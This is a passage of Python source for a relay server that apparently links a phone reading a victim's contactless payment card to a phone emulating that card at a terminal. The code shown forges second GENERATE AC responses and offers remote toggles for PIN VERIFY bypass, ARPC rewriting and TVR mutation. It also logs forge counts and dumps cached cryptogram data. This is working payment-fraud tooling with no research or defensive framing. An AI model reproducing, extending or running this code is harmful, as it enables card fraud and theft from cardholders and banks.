        forged = forge_2nd_gac(cache, forced_cid=forced_cid, brand=brand)

        if forged is None:
            log.error(
                f"[ARPC-FORGE] Unknown template (cached={cache.template}); "
                f"cannot forge 2nd GAC. Failing closed with 6F00."
            )
            self._send_frame(self.emulator_addr, SID_RAPDU,
                             build_exchange_payload(self.state.pending_exchange_id, SW_6F00))
            with self.lock:
                self.state.second_ae_pending = False
                self.state.second_ae_reason = "forge failed: unknown template"
                self.state.pending_capdu = None
                self.state.pending_exchange_id = None
            return

        self.guard.record_sw(SW_9000)
        ok, guard_reason = self.guard.advance(Phase.SECOND_GAC_FORGED)
        if not ok:
            log.error(f"[GUARD] Forge execution blocked: {guard_reason}")
            self._send_frame(self.emulator_addr, SID_RAPDU,
                             build_exchange_payload(self.state.pending_exchange_id, SW_6F00))
            with self.lock:
                self.state.second_ae_pending = False
                self.state.second_ae_reason = f"forge blocked: {guard_reason}"
                self.state.pending_capdu = None
                self.state.pending_exchange_id = None
            return

        with self.lock:
            self.state.arpc_forge_count += 1
            self.state.second_ae_pending = False
            self.state.second_ae_reason = f"forged and consumed (#{self.state.arpc_forge_count})"
            count = self.state.arpc_forge_count

        log.debug(f"[GUARD] {guard_reason}")

        atc_str = cache.atc.hex() if cache.atc else "default"
        iad_source = "cached" if cache.iad else f"brand-default:{brand}"
        log.info(
            f"[ARPC-FORGE #{count}] 2nd GAC forged "
            f"(template=0x{cache.template:02X}, brand={brand}, "
            f"CID=0x{forced_cid:02X}, ATC={atc_str}, IAD={iad_source}, "
            f"P1_req={gac_p1_name(p1)}) -> EMULATOR "
            f"[guard={self.guard.phase.name}]"
        )
        _record_apdu("FORGE>EMU", "RAPDU", "GENERATE AC (2nd) FORGED", forged,
                     note=f"template=0x{cache.template:02X} brand={brand} CID=0x{forced_cid:02X}")
        self._send_frame(self.emulator_addr, SID_RAPDU,
                         build_exchange_payload(self.state.pending_exchange_id, forged))
        with self.lock:
            self.state.pending_capdu = None
            self.state.pending_exchange_id = None

    def _handle_heartbeat(self, payload: bytes, addr: Tuple[str, int]) -> None:
        if addr not in (self.reader_addr, self.emulator_addr):
            log.warning(f"HEARTBEAT from unregistered address {addr}")
            return
        self._send_ack(addr, "HEARTBEAT")

    def _session_begin_rate_ok(self, addr: Tuple[str, int]) -> bool:
        # Two phones commonly share one public IP behind carrier NAT. Their
        # UDP endpoints are distinct clients and must not rate-limit each
        # other's session setup.
        key = addr
        now = time.time()
        last = self._session_begin_timestamps.get(key)
        if last is not None and now - last < self.SESSION_BEGIN_RATE_LIMIT / self.SESSION_BEGIN_BURST:
            return False
        self._session_begin_timestamps[key] = now
        cutoff = now - self.SESSION_BEGIN_RATE_LIMIT - 60
        for stale_key in [k for k, ts in self._session_begin_timestamps.items() if ts < cutoff]:
            del self._session_begin_timestamps[stale_key]
        return True

    def _handle_ctrl(self, payload: bytes, addr: Tuple[str, int]) -> None:
        if addr not in (self.reader_addr, self.emulator_addr):
            log.warning(f"CTRL from unregistered address {addr} rejected")
            self._send_ctrl_response(addr, "ERR NOT_REGISTERED")
            return

        body, auth_ok = self._ctrl_verify_hmac(
            payload, self._incoming_epoch, 0
        )
        if not auth_ok:
            log.warning(f"CTRL from {addr}: HMAC verification FAILED - dropped")
            return

        command = body.decode("utf-8", errors="replace").strip().upper()
        log.info(f"CTRL from {addr}: {command}")

        if command.startswith("SESSION_BEGIN"):
            parts = command.split(None, 1)
            token = parts[1] if len(parts) == 2 else "LEGACY"
            if not self._session_begin_rate_ok(addr):
                log.warning(f"SESSION_BEGIN rate-limited from {addr}")
                self._send_ctrl_response(addr, "ERR RATE_LIMITED")
                return
            request_key = (addr, token)
            epoch = self._session_requests.get(request_key)
            if epoch is None:
                with self.lock:
                    self.active_epoch = (self.active_epoch % 0xFFFFFFFF) + 1
                    self.state.reset()
                    self.guard.reset()
                    if self._packet_router:
                        self._packet_router.reset_session()
                    epoch = self.active_epoch
                    self._session_requests[request_key] = epoch
                    if len(self._session_requests) > 128:
                        self._session_requests = {request_key: epoch}
                log.info(f"Session epoch opened: {epoch} [guard={self.guard.phase.name}]")
            else:
                if epoch != self.active_epoch:
                    self._send_ctrl_response(addr, "ERR SESSION_SUPERSEDED")
                    return
                log.info(f"Session epoch retry acknowledged: {epoch}")
            self._send_ctrl_response(addr, f"SESSION_ACK {epoch} {token}")
            target = self.emulator_addr if addr == self.reader_addr else self.reader_addr
            if target:
                self._send_ctrl_response(target, f"SESSION_BEGIN {epoch}")
            return

        if command == "CARD_PRESENT":
            self._reset_session("card present")
            self.state.card_present = True
            target = self.emulator_addr if addr == self.reader_addr else self.reader_addr
            if target:
                self._send_frame(target, SID_CTRL, body)
            self._send_ctrl_response(addr, "OK CARD_PRESENT")
            return

        if command == "CARD_REMOVED":
            self._reset_session("card removed")
            target = self.emulator_addr if addr == self.reader_addr else self.reader_addr
            if target:
                self._send_frame(target, SID_CTRL, body)
            self._send_ctrl_response(addr, "OK CARD_REMOVED")
            return

        if command == "SESSION_RESET":
            self._reset_session("control command")
            target = self.emulator_addr if addr == self.reader_addr else self.reader_addr
            if target:
                self._send_frame(target, SID_CTRL, body)
            self._send_ctrl_response(addr, f"OK SESSION_RESET SEQ={self.state.seq}")
            return

        if command == "STATUS":
            from constants import PROTOCOL_VERSION, CID_NAME_MAP
            aid_hex = self.state.selected_aid.hex().upper() if self.state.selected_aid else None
            status = {
                "ready": (self.reader_addr is not None and self.emulator_addr is not None),
                "reader_registered": self.reader_addr is not None,
                "emulator_registered": self.emulator_addr is not None,
                "reader_peer": list(self.reader_addr) if self.reader_addr else None,
                "emulator_peer": list(self.emulator_addr) if self.emulator_addr else None,
                "reader_card_present": self.state.card_present,
                "verify_bypass_enabled": self.state.verify_bypass_enabled,
                "verify_bypass_count": self.state.verify_bypass_count,
                "arpc_forge_enabled": self.state.arpc_forge_enabled,
                "arpc_forge_count": self.state.arpc_forge_count,
                "arpc_rewrite_enabled": self.state.arpc_rewrite_enabled,
                "arpc_rewrite_count": self.state.arpc_rewrite_count,
                "tvr_mutation_enabled": self.state.tvr_mutation_enabled,
                "tvr_mutation_count": self.state.tvr_mutation_count,
                "gpo_template": (f"0x{self.state.gpo_template:02X}"
                                 if self.state.gpo_template else None),
                "second_ae_pending": self.state.second_ae_pending,
                "second_ae_reason": self.state.second_ae_reason,
                "brand": self.state.brand,
                "selected_aid": aid_hex,
                "session_seq": self.state.seq,
                "session_epoch": self.active_epoch,
                "protocol_version": PROTOCOL_VERSION,
                "reader_protocol_version": self._peer_versions.get(self.reader_addr, 0),
                "emulator_protocol_version": self._peer_versions.get(self.emulator_addr, 0),
                "guard_phase": self.guard.status(),
            }
            self._send_ctrl_bytes(addr, json.dumps(status).encode())
            return

        if command == "DUMP_STATE":
            cache = self.state.arqc_cache
            from constants import CID_NAME_MAP, PROTOCOL_VERSION
            state_dump = {
                "session_seq": self.state.seq,
                "session_epoch": self.active_epoch,
                "protocol_version": PROTOCOL_VERSION,
                "brand": self.state.brand,
                "selected_aid": (self.state.selected_aid.hex().upper()
                                 if self.state.selected_aid else None),
                "gpo_template": (f"0x{self.state.gpo_template:02X}"
                                 if self.state.gpo_template else None),
                "second_ae_pending": self.state.second_ae_pending,
                "second_ae_reason": self.state.second_ae_reason,
                "arqc_cache": {
                    "template": f"0x{cache.template:02X}" if cache.template else None,
                    "cid": f"0x{cache.cid:02X}" if cache.cid is not None else None,
                    "cid_name": CID_NAME_MAP.get(cache.cid, "?") if cache.cid is not None else None,
                    "atc": cache.atc.hex().upper() if cache.atc else None,
                    "ac": cache.ac.hex().upper() if cache.ac else None,
                    "iad": cache.iad.hex().upper() if cache.iad else None,
                    "parse_notes": cache.parse_notes,
                    "is_complete": cache.is_complete(),
                },
                "counters": {
                    "verify_bypass": self.state.verify_bypass_count,
                    "arpc_forge": self.state.arpc_forge_count,
                    "arpc_rewrite": self.state.arpc_rewrite_count,
                    "tvr_mutation": self.state.tvr_mutation_count,
                },
                "toggles": {
                    "verify_bypass_enabled": self.state.verify_bypass_enabled,
                    "arpc_forge_enabled": self.state.arpc_forge_enabled,
                    "arpc_rewrite_enabled": self.state.arpc_rewrite_enabled,
                    "tvr_mutation_enabled": self.state.tvr_mutation_enabled,
                },
                "pending_capdu": (self.state.pending_capdu.hex().upper()
                                  if self.state.pending_capdu else None),
                "guard_phase": self.guard.status(),
            }
            self._send_ctrl_bytes(addr, json.dumps(state_dump, indent=2).encode())
            return

        if command == "DUMP_LAST":
            dump = get_apdu_history(20)
            self._send_ctrl_bytes(addr, json.dumps(dump, default=str).encode())
            return

        if command.startswith("DUMP_LAST "):
            try:
                n = int(command.split()[1])
                n = max(1, min(n, 300))
            except (ValueError, IndexError):
                n = 20
            dump = get_apdu_history(n)
            self._send_ctrl_bytes(addr, json.dumps(dump, default=str).encode())
            return

        if command == "VERIFY_BYPASS ON":
            self.state.verify_bypass_enabled = True
            log.info("VERIFY bypass ENABLED via CTRL")
            self._send_ctrl_response(addr, "OK VERIFY_BYPASS=ON")
            return

        if command == "VERIFY_BYPASS OFF":
            self.state.verify_bypass_enabled = False
            log.info("VERIFY bypass DISABLED via CTRL")
            self._send_ctrl_response(addr, "OK VERIFY_BYPASS=OFF")
            return

        if command == "ARPC_FORGE ON":
            self.state.arpc_forge_enabled = True
            log.info("ARPC forge ENABLED via CTRL")
            self._send_ctrl_response(addr, "OK ARPC_FORGE=ON")
            return

        if command == "ARPC_FORGE OFF":
            self.state.arpc_forge_enabled = False
            log.info("ARPC forge DISABLED via CTRL")
            self._send_ctrl_response(addr, "OK ARPC_FORGE=OFF")
            return

        if command == "ARPC_REWRITE ON":
            self.state.arpc_rewrite_enabled = True
            log.info("ARPC rewrite ENABLED via CTRL")
            self._send_ctrl_response(addr, "OK ARPC_REWRITE=ON")
            return

        if command == "ARPC_REWRITE OFF":
            self.state.arpc_rewrite_enabled = False
            log.info("ARPC rewrite DISABLED via CTRL")
            self._send_ctrl_response(addr, "OK ARPC_REWRITE=OFF")
            return

        if command == "TVR_MUTATE ON":
            self.state.tvr_mutation_enabled = True
            log.info("TVR mutation ENABLED via CTRL")
            self._send_ctrl_response(addr, "OK TVR_MUTATE=ON")
            return

        if command == "TVR_MUTATE OFF":
            self.state.tvr_mutation_enabled = False
            log.info("TVR mutation DISABLED via CTRL")
            self._send_ctrl_response(addr, "OK TVR_MUTATE=OFF")
            return

        if command == "GUARD_STATUS":
            self._send_ctrl_bytes(addr, json.dumps(self.guard.status()).encode())
            return

        if command == "GUARD_RESET":
            self._reset_session("guard reset control command")
            log.info("Guard and session state reset via CTRL")
            self._send_ctrl_response(addr, f"OK GUARD_RESET PHASE={self.guard.phase.name}")
            return

        if self._packet_router:
            parts = command.split(None, 1)
            if parts and parts[0] == "MODE" and len(parts) > 1:
                try:
                    self._packet_router.set_mode(parts[1])
                    self._send_ctrl_response(addr, f"OK MODE={self._packet_router.get_mode()}")
                except Exception as e:
                    self._send_ctrl_response(addr, f"ERR MODE: {e}")
                return

        target = self.emulator_addr if addr == self.reader_addr else self.reader_addr
        if target:
            self._send_frame(target, SID_CTRL, body)

def main() -> None:
    import sys

    port = int(sys.argv[1]) if len(sys.argv) > 1 else 5566
    server = RelayServer(port=port)

    def request_shutdown(signum, frame) -> None:
        server._shutdown_requested = True

    signal.signal(signal.SIGTERM, request_shutdown)
    signal.signal(signal.SIGINT, request_shutdown)

    try:
        server.start()
    except KeyboardInterrupt:
        pass
    finally:
        server.stop()

if __name__ == "__main__":
    main()
